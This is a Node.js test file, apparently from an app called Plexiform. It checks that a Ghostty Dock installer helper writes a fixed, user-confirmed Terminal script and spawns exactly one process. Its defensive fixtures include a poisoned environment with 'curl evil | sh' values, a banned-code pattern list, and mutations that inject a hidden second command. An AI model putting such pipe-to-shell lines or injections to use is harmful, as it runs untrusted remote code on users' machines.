'use strict';
// Security review L1: the installer's command and "Plexiform runs one process"
// were only regex checks, which `process['env']` or a second destructured
// execFile got past. These check behaviour: with a poisoned environment the
// script is a frozen snapshot, and launch() makes exactly one child_process
// call, `open -a Terminal <file>`. The checks are also run against the
// reviewer's two mutations to prove they catch them.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const cp = require('node:child_process');
const { testTempDir } = require('./helpers/tmp');

const SRC = path.join(__dirname, '..', 'src', 'ghostty-dock-install.js');
const CMD = 'curl -fsSL https://raw.githubusercontent.com/andrewbakercloudscale/ghossty-dock/main/get.sh | bash';
const SNAPSHOT = (file, dir) => [
  '#!/bin/zsh',
  'setopt pipefail',
  `/bin/mkdir '${dir}/started' 2>/dev/null || exit 0`,
  `/bin/rm -f '${file}'`,
  `trap '/bin/rm -rf '\\''${dir}'\\''' EXIT`,
  "print -r -- 'Plexiform opened this window to install Ghostty Dock, a third-party app by Andrew Baker (not part of Plexiform).'",
  "print -r -- 'See https://github.com/andrewbakercloudscale/ghossty-dock'",
  "print -r -- 'On macOS 13 or 14, install jq first: brew install jq'",
  "print -r -- ''",
  "print -r -- 'This will run:'",
  `print -r -- '  ${CMD}'`,
  "print -r -- ''",
  "print -r -- 'Press Return or type y to install; anything else cancels.'",
  'IFS= read -r reply || exit 1',
  "[[ -z $reply || $reply == [yY] ]] || { print -r -- 'Cancelled: nothing was installed.'; exit 1; }",
  CMD,
  'result=$?',
  "print -r -- ''",
  'if [ $result -eq 0 ]; then print -r -- \'Done. You can close this window; Plexiform will notice Ghostty Dock by itself.\'; else print -r -- "The installer stopped with code $result."; fi',
  'exit $result',
  '',
].join('\n');

const POISON = { PLX_CMD: 'curl evil | sh', GHOSTTY_DOCK_INSTALL: 'curl evil | sh', INSTALL_COMMAND: 'curl evil | sh', HOME: '/evil', PATH: '/evil', SHELL: '/evil/sh', TMPDIR: '/evil' };
const SPAWNERS = ['execFile', 'spawn', 'exec', 'fork', 'execSync', 'execFileSync', 'spawnSync'];

// Loads `srcFile` fresh with child_process stubbed and the env poisoned, then
// writes and "opens" a script in a temp folder. Returns what failed.
async function check(srcFile) {
  const problems = [];
  const calls = [];
  const saved = Object.fromEntries(SPAWNERS.map((k) => [k, cp[k]]));
  const env = { ...process.env };
  const root = testTempDir('px-dock-snap-');
  for (const k of SPAWNERS) {
    cp[k] = (...args) => {
      calls.push([k, args[0], args[1]]);
      const cb = args.find((a) => typeof a === 'function');
      if (cb) setImmediate(() => cb(null, '', ''));
      return { on() { return this; }, kill() {}, stdout: null, stderr: null };
    };
  }
  Object.assign(process.env, POISON);
  try {
    delete require.cache[require.resolve(srcFile)];
    const I = require(srcFile);
    if (I.INSTALL_COMMAND !== CMD) problems.push('INSTALL_COMMAND changed');
    const file = '/T/plexiform-terminal-X/continue.command';
    if (I.scriptBody(file, path.dirname(file)) !== SNAPSHOT(file, path.dirname(file))) problems.push('scriptBody differs from the snapshot');
    let opened = null;
    const r = await I.launch({ tempDir: root });
    if (!r.ok) problems.push(`launch failed: ${r.error}`);
    if (calls.length !== 1) problems.push(`expected one child_process call, got ${JSON.stringify(calls)}`);
    else {
      const [kind, bin, args] = calls[0];
      if (kind !== 'execFile' || bin !== '/usr/bin/open' || !Array.isArray(args) || args.length !== 3 || args[0] !== '-a' || args[1] !== 'Terminal') problems.push(`unexpected call ${JSON.stringify(calls[0])}`);
      else opened = args[2];
    }
    if (opened) {
      const body = fs.readFileSync(opened, 'utf8');
      if (body !== SNAPSHOT(opened, path.dirname(opened))) problems.push('the written script differs from the snapshot');
      if (body.split('\n').filter((l) => l === CMD).length !== 1) problems.push('the command line is not there exactly once');
    }
    const src = fs.readFileSync(srcFile, 'utf8');
    const imports = src.match(/require\(\s*['"`](?:node:)?child_process['"`]\s*\)/g) || [];
    if (imports.length !== 1 || !src.includes("const { execFile } = require('node:child_process');")) problems.push('child_process import is not exactly { execFile }');
    for (const banned of [/process\.env/, /process\s*\[/, /globalThis/, /\bReflect\b/, /\beval\s*\(/, /\bFunction\s*\(/]) if (banned.test(src)) problems.push(`source uses ${banned}`);
  } finally {
    Object.assign(cp, saved);
    for (const k of Object.keys(process.env)) if (!(k in env)) delete process.env[k];
    Object.assign(process.env, env);
    delete require.cache[require.resolve(srcFile)];
    fs.rmSync(root, { recursive: true, force: true });
  }
  return problems;
}

function mutant(name, edit) {
  const dir = testTempDir(`px-dock-mut-${name}-`);
  const file = path.join(dir, 'ghostty-dock-install.js');
  const src = fs.readFileSync(SRC, 'utf8');
  const out = edit(src);
  assert.notEqual(out, src, `mutation ${name} applied`);
  fs.writeFileSync(file, out);
  return { file, dir };
}

test('with a poisoned env, the script is the frozen snapshot and launch makes exactly one call: open -a Terminal <file>', async () => {
  assert.deepEqual(await check(SRC), []);
});

test('the checks catch the reviewer\'s mutations', async () => {
  const env = mutant('env', (s) => s.replace('    INSTALL_COMMAND,\n', "    process['env'].PLX_CMD || INSTALL_COMMAND,\n"));
  const run2 = mutant('run2', (s) => s
    .replace("const { execFile } = require('node:child_process');", "const { execFile, execFile: run2 } = require('node:child_process');")
    .replace('  const s = writeScript({ tempDir, f });\n', "  const s = writeScript({ tempDir, f });\n  run2('/bin/bash', ['-c', INSTALL_COMMAND], () => {});\n"));
  try {
    const a = await check(env.file);
    assert.ok(a.some((p) => /snapshot/.test(p)) && a.includes(`source uses ${/process\s*\[/}`), JSON.stringify(a));
    const b = await check(run2.file);
    assert.ok(b.some((p) => /one child_process call/.test(p)) && b.some((p) => /exactly \{ execFile \}/.test(p)), JSON.stringify(b));
  } finally { for (const m of [env, run2]) fs.rmSync(m.dir, { recursive: true, force: true }); }
});
